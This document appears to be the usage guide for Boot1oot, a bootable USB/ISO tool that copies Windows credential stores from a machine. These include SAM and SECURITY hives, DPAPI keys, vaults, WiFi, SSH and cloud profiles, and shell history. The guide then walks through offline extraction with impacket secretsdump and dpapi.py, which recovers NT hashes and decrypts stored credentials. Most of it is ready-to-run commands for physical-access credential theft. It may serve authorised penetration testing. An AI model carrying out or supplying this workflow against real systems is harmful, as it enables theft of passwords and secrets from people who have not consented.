# Boot and USB Usage

Boot1oot ships as two artifacts:

- `boot1oot.iso` for VM or virtual CD/DVD boot.
- `boot1oot.img` for raw USB writing with persistent loot storage.

The live root filesystem is RAM-only in both modes. The USB image adds a
writable FAT partition labeled `B1OOT_LOOT`.

## Before Booting

- Use a dedicated USB drive; writing `boot1oot.img` overwrites it.
- Disable Secure Boot if the unsigned image is blocked.
- Keep BitLocker recovery keys available for systems that enforce recovery
  after external boot or firmware changes.
- Prefer a full Windows shutdown before read-write filesystem work:

```powershell
shutdown /s /t 0
```

## Write USB Media

### Windows

Use Rufus or another raw-image writer:

1. Select the USB drive.
2. Select `boot1oot.img`.
3. Use raw image mode when prompted.
4. Start the write.

### Linux

```sh
lsblk
sudo umount /dev/sdX*
sudo dd if=dist/boot1oot.img of=/dev/sdX bs=4M status=progress oflag=sync
sync
```

Replace `/dev/sdX` with the whole USB disk, not a partition.

### macOS

```sh
diskutil list
diskutil unmountDisk /dev/diskN
sudo dd if=dist/boot1oot.img of=/dev/rdiskN bs=4m status=progress
sync
diskutil eject /dev/diskN
```

## Boot Options

For physical machines, use the firmware one-time boot menu and choose the USB
entry. On UEFI systems, prefer the entry beginning with `UEFI:` when both legacy
and UEFI entries are shown.

From Windows, Shift-Restart can also expose firmware boot entries:

1. Hold `Shift` while selecting `Restart`.
2. Choose `Use a device`.
3. Select the USB drive.

For VMs, attach `boot1oot.iso` as a virtual CD/DVD and boot from it.

## After Boot

```sh
boot1oot scan
boot1oot mount -r
boot1oot loot
```

For write-capable filesystem work:

```sh
boot1oot mount -rw
```

Before returning to Windows:

```sh
cd /
boot1oot unmount
poweroff
```

## Retrieving Loot

USB image boots write to:

```text
B1OOT_LOOT:/boot1oot-loot-<time>-<pid>
```

ISO boots or systems without writable USB loot storage use the encrypted fallback:

```text
C:\Users\Public\Boot1oot\boot1oot-loot-<time>-<pid>.tar.enc
```

Decrypt fallback archives with:

```sh
openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 \
  -pass pass:boot1oot \
  -in boot1oot-loot-<time>-<pid>.tar.enc \
  -out boot1oot-loot-<time>-<pid>.tar

tar -xf boot1oot-loot-<time>-<pid>.tar
```

Use your configured `BOOT1OOT_LOOT_PASSPHRASE` instead of `boot1oot` if you set
one before collection.

## Collected Artifacts

Loot is stored under a `windows/` directory that mirrors the source Windows
paths. `Windows/NTDS/NTDS.dit` is intentionally not collected.

Core offline secrets:

- `Windows/System32/config/{SAM,SYSTEM,SECURITY,SOFTWARE,DEFAULT}` plus
  transaction logs and `RegBack`.
- User hives: `Users/<user>/NTUSER.DAT` and
  `Users/<user>/AppData/Local/Microsoft/Windows/UsrClass.dat`.
- DPAPI material from user, system, and machine
  `Credentials`, `Crypto`, `Protect`, and `Vault` paths.

Targeted user artifacts:

- PowerShell PSReadLine history.
- Modern Notepad tab state and Notepad++ backups.
- Recent-file `.lnk` metadata.
- WinSCP, mRemoteNG, MobaXterm, Teams, AWS, and SSH profile files.

Targeted machine/application artifacts:

- WiFi profile XMLs under `ProgramData/Microsoft/Wlansvc/Profiles/Interfaces`.
- IIS configuration under `Windows/System32/inetsrv/config`.
- UltraVNC configuration files under common `Program Files` locations.

## Offline Extraction Examples

Use the helper script to run the offline extraction flow:

```sh
python3 scripts/boot1oot-extract.py /path/to/boot1oot-loot-<time>-<pid>
```

The helper auto-detects `secretsdump.py` / `impacket-secretsdump` and
`dpapi.py` / `impacket-dpapi`. By default it prints concise results and artifact
locations only. It does not write reports or raw tool output unless `-o` is set:

```sh
python3 scripts/boot1oot-extract.py /path/to/boot1oot-loot-<time>-<pid> -o extracted
```

For local accounts, the helper normally gets NT hashes from the offline
`SAM`/`SYSTEM` hives and tries them against matching profile names. For user
DPAPI material, provide the user's password when available:

```sh
python3 scripts/boot1oot-extract.py /path/to/boot1oot-loot-<time>-<pid> \
  --password alice='<password>'
```

If automatic SAM-to-profile matching is wrong or unavailable, override it with a
known NT hash:

```sh
python3 scripts/boot1oot-extract.py /path/to/boot1oot-loot-<time>-<pid> \
  --hash alice=<nthash>
```

If profile names do not match local account names, bind key material directly to
the SID folder found under `Users/<user>/AppData/*/Microsoft/Protect`:

```sh
python3 scripts/boot1oot-extract.py /path/to/boot1oot-loot-<time>-<pid> \
  --sid-hash S-1-5-21-...-1001=<nthash>
```

Use `--try-all-hashes` to try every local NT hash parsed from `secretsdump`
against each collected user DPAPI SID. Use `--try-all-masterkeys` when a blob
does not expose a clean masterkey GUID.

Manual `secretsdump.py` reference:

```sh
secretsdump.py \
  -sam windows/Windows/System32/config/SAM \
  -system windows/Windows/System32/config/SYSTEM \
  -security windows/Windows/System32/config/SECURITY \
  LOCAL
```

Manual DPAPI reference:

```sh
dpapi.py credential \
  -file windows/Users/<user>/AppData/Roaming/Microsoft/Credentials/<credential-file>
```

The output includes a masterkey GUID. Find the matching file under
`Users/<user>/AppData/*/Microsoft/Protect/<sid>/`.

Decrypt a user masterkey with a password or NT hash:

```sh
dpapi.py masterkey \
  -file windows/Users/<user>/AppData/Roaming/Microsoft/Protect/<sid>/<masterkey-guid> \
  -sid <sid> \
  -password '<password>'

dpapi.py masterkey \
  -file windows/Users/<user>/AppData/Roaming/Microsoft/Protect/<sid>/<masterkey-guid> \
  -sid <sid> \
  -key 0x<nthash>
```

Use the printed `Decrypted key: 0x...` value on credential or vault files:

```sh
dpapi.py credential \
  -file windows/Users/<user>/AppData/Roaming/Microsoft/Credentials/<credential-file> \
  -key 0x<decrypted-masterkey>

dpapi.py vault \
  -vpol windows/Users/<user>/AppData/Roaming/Microsoft/Vault/<vault>/<policy-file>.vpol \
  -key 0x<decrypted-masterkey>
```

For machine or `LocalSystem` DPAPI material, decrypt the machine masterkey with
the offline `SYSTEM` and `SECURITY` hives:

```sh
dpapi.py masterkey \
  -file windows/Windows/System32/Microsoft/Protect/<sid>/<masterkey-guid> \
  -system windows/Windows/System32/config/SYSTEM \
  -security windows/Windows/System32/config/SECURITY
```
